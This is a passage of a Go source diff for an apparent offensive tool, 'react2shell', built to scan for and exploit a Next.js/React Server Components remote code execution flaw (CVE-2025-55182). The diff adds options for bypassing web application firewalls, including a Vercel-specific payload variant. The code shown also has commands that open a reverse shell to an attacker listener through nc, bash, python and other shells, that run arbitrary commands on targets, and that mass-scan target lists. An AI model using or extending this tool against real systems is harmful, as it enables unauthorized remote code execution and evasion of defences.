+	rand.Seed(time.Now().UnixNano())
 
 	if len(os.Args) < 2 {
 		printUsage()
@@ -913,7 +1038,7 @@ func main() {
 	case "exec":
 		cmdExec()
 	case "version", "-v", "--version":
-		fmt.Printf("cve-2025-55182 v%s\n", Version)
+		fmt.Printf("react2shell v%s\n", Version)
 	case "help", "-h", "--help":
 		printUsage()
 	default:
@@ -940,12 +1065,15 @@ func cmdScan() {
 	quiet := fs.Bool("q", false, "Quiet mode")
 	maxMemory := fs.Int64("max-mem", 0, "Maximum memory in MB (0 = unlimited)")
 	streamMode := fs.Bool("stream", false, "Stream mode - write results immediately, lower memory")
+	wafBypass := fs.Bool("waf-bypass", false, "Add junk data to bypass WAF content inspection")
+	wafBypassSize := fs.Int("waf-bypass-size", 128, "Size of junk data in KB for WAF bypass")
+	vercelWAFBypass := fs.Bool("vercel-waf-bypass", false, "Use Vercel WAF bypass payload variant")
 	fs.Parse(os.Args[2:])
 
-	log := NewLogger(*quiet, *jsonOut)
+	logger := NewLogger(*quiet, *jsonOut)
 
 	if *target == "" && *listFile == "" {
-		log.Error("Specify target with -u or list with -l")
+		logger.Error("Specify target with -u or list with -l")
 		fs.PrintDefaults()
 		os.Exit(1)
 	}
@@ -957,32 +1085,40 @@ func cmdScan() {
 		var err error
 		targets, err = loadTargets(*listFile)
 		if err != nil {
-			log.Error("Failed to load targets: %v", err)
+			logger.Error("Failed to load targets: %v", err)
 			os.Exit(1)
 		}
 	}
 
 	if len(targets) == 0 {
-		log.Error("No valid targets")
+		logger.Error("No valid targets")
 		os.Exit(1)
 	}
 
-	config := &ScanConfig{
-		Port:        *port,
-		Path:        *path,
-		Threads:     *threads,
-		Timeout:     time.Duration(*timeout) * time.Second,
-		SafeMode:    *safeMode,
-		Insecure:    *insecure,
-		UseTLS:      !*noTLS,
-		Verbose:     *verbose,
-		JSONOutput:  *jsonOut,
-		Quiet:       *quiet,
-		MaxMemoryMB: *maxMemory,
-		StreamMode:  *streamMode,
+	actualTimeout := *timeout
+	if *wafBypass && *timeout == 10 {
+		actualTimeout = 20
 	}
 
-	runScan(targets, config, *output, log)
+	config := &ScanConfig{
+		Port:            *port,
+		Path:            *path,
+		Threads:         *threads,
+		Timeout:         time.Duration(actualTimeout) * time.Second,
+		SafeMode:        *safeMode,
+		Insecure:        *insecure,
+		UseTLS:          !*noTLS,
+		Verbose:         *verbose,
+		JSONOutput:      *jsonOut,
+		Quiet:           *quiet,
+		MaxMemoryMB:     *maxMemory,
+		StreamMode:      *streamMode,
+		WAFBypass:       *wafBypass,
+		WAFBypassSizeKB: *wafBypassSize,
+		VercelWAFBypass: *vercelWAFBypass,
+	}
+
+	runScan(targets, config, *output, logger)
 }
 
 func cmdExploit() {
@@ -996,20 +1132,21 @@ func cmdExploit() {
 	lhost := fs.String("lhost", "", "Listener IP")
 	lport := fs.Int("lport", 4444, "Listener port")
 	shell := fs.String("shell", "node", "Shell: node,bash,sh,nc,nc-e,python,python3,perl,ruby,php")
+	verbose := fs.Bool("v", false, "Verbose output (show full request/response)")
 	fs.Parse(os.Args[2:])
 
-	log := NewLogger(false, false)
+	logger := NewLogger(false, false)
 
 	if *target == "" {
-		log.Error("Target required (-u)")
+		logger.Error("Target required (-u)")
 		os.Exit(1)
 	}
 	if *lhost == "" {
-		log.Error("Listener IP required (-lhost)")
+		logger.Error("Listener IP required (-lhost)")
 		os.Exit(1)
 	}
 
-	log.Warning("Start listener first: nc -lvnp %d", *lport)
+	logger.Warning("Start listener first: nc -lvnp %d", *lport)
 
 	config := &ExploitConfig{
 		Target:       *target,
@@ -1021,10 +1158,11 @@ func cmdExploit() {
 		ListenerIP:   *lhost,
 		ListenerPort: *lport,
 		Shell:        *shell,
+		Verbose:      *verbose,
 	}
 
-	if err := exploit(config, log); err != nil {
-		log.Error("Exploit failed: %v", err)
+	if err := exploit(config, logger); err != nil {
+		logger.Error("Exploit failed: %v", err)
 		os.Exit(1)
 	}
 }
@@ -1038,27 +1176,39 @@ func cmdExec() {
 	insecure := fs.Bool("k", true, "Skip TLS verification")
 	timeout := fs.Int("timeout", 30, "Timeout in seconds")
 	command := fs.String("c", "", "Command to execute")
+	verbose := fs.Bool("v", false, "Verbose output (show full request/response)")
 	fs.Parse(os.Args[2:])
 
-	log := NewLogger(false, false)
+	logger := NewLogger(false, false)
 
 	if *target == "" {
-		log.Error("Target required (-u)")
+		logger.Error("Target required (-u)")
 		os.Exit(1)
 	}
 	if *command == "" {
-		log.Error("Command required (-c)")
+		logger.Error("Command required (-c)")
 		os.Exit(1)
 	}
 
-	if err := execCmd(*target, *port, !*noTLS, *path, *command, *insecure, time.Duration(*timeout)*time.Second, log); err != nil {
-		log.Error("Execution failed: %v", err)
+	config := &ExecConfig{
+		Target:   *target,
+		Port:     *port,
+		Path:     *path,
+		UseTLS:   !*noTLS,
+		Insecure: *insecure,
+		Timeout:  time.Duration(*timeout) * time.Second,
+		Command:  *command,
+		Verbose:  *verbose,
+	}
+
+	if err := execCmd(config, logger); err != nil {
+		logger.Error("Execution failed: %v", err)
 		os.Exit(1)
 	}
 }
 
 func printUsage() {
-	fmt.Fprintf(os.Stderr, `cve-2025-55182 v%s - Next.js RSC RCE Scanner (Memory Optimized)
+	fmt.Fprintf(os.Stderr, `react2shell v%s - React2Shell Scanner (CVE-2025-55182)
 
 Usage:
   %s <command> [options]
@@ -1070,19 +1220,60 @@ Commands:
   version   Show version
   help      Show this help
 
-Examples:
+Scan Examples:
   %s scan -u example.com
   %s scan -l targets.txt -t 50 -o vuln.txt
   %s scan -l targets.txt -t 100 -max-mem 256 -stream
   %s scan -u 192.168.1.100 -p 3000 -no-tls -safe
-  %s exploit -u example.com -lhost 10.0.0.5 -lport 4444
-  %s exec -u example.com -c 'id'
+  %s scan -u example.com -waf-bypass
+  %s scan -u example.com -waf-bypass -waf-bypass-size 256
+  %s scan -u example.com -vercel-waf-bypass
 
-Memory Options:
-  -max-mem 256    Limit memory to 256MB
-  -max-mem 512    Limit memory to 512MB  
-  -stream         Stream mode - minimal memory, writes results immediately
+Exploit Examples:
+  %s exploit -u example.com -lhost 10.0.0.5 -lport 4444
+  %s exploit -u example.com -lhost 10.0.0.5 -lport 4444 -v
+  %s exec -u example.com -c 'id'
+  %s exec -u example.com -c 'id' -v
+
+Scan Options:
+  -u              Single target URL or IP
+  -l              File with targets (one per line)
+  -p              Target port (default: 443)
+  -path           Request path (default: /)
+  -no-tls         Use HTTP instead of HTTPS
+  -k              Skip TLS verification (default: true)
+  -timeout        Timeout in seconds (default: 10)
+  -t              Concurrent threads (default: 10)
+  -safe           Safe detection mode (no code execution)
+  -o              Output file for vulnerable hosts
+  -json           JSON output
+  -v              Verbose output
+  -q              Quiet mode
+  -max-mem        Maximum memory in MB (0 = unlimited)
+  -stream         Stream mode - minimal memory usage
+  -waf-bypass     Add junk data to bypass WAF content inspection
+  -waf-bypass-size Size of junk data in KB (default: 128)
+  -vercel-waf-bypass Use Vercel WAF bypass payload variant
+
+Exploit/Exec Options:
+  -u              Target URL or IP
+  -p              Target port (default: 443)
+  -path           Request path (default: /)
+  -no-tls         Use HTTP instead of HTTPS
+  -k              Skip TLS verification (default: true)
+  -timeout        Timeout in seconds (default: 30)
+  -v              Verbose output (show full request/response)
+
+Exploit-specific:
+  -lhost          Listener IP address
+  -lport          Listener port (default: 4444)
+  -shell          Shell type: node,bash,sh,nc,nc-e,python,python3,perl,ruby,php
+
+Exec-specific:
+  -c              Command to execute
 
 Run '%s <command> -h' for command-specific options.
-`, Version, os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0])
+`, Version, os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0])
 }
+
+var _ = httputil.DumpRequest
